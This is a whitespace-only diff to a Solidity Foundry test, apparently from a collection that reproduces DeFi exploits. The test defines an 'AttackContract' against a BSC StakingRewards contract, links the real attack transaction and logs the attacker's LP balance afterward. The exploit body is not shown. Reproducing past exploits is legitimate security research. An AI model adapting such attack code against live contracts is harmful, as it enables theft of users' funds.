@@ -12,10 +12,13 @@ import "./../interface.sol";
 // Attack TX: https://bscscan.com/tx/0x784b68dc7d06ee181f3127d5eb5331850b5e690cc63dd099cd7b8dc863204bf6
 
 interface IStakingRewards {
+
     function withdraw(uint256 amount) external;
+
 }
 
 contract AttackContract is Test {
+
     CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
     IStakingRewards constant StakingRewards = IStakingRewards(0xB3FB1D01B07A706736Ca175f827e4F56021b85dE);
     IERC20 constant uniLP = IERC20(0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042);
@@ -40,4 +43,5 @@ contract AttackContract is Test {
         */
         emit log_named_decimal_uint("After exploiting, Attacker UniLP Balance", uniLP.balanceOf(address(this)), 18);
     }
+
 }
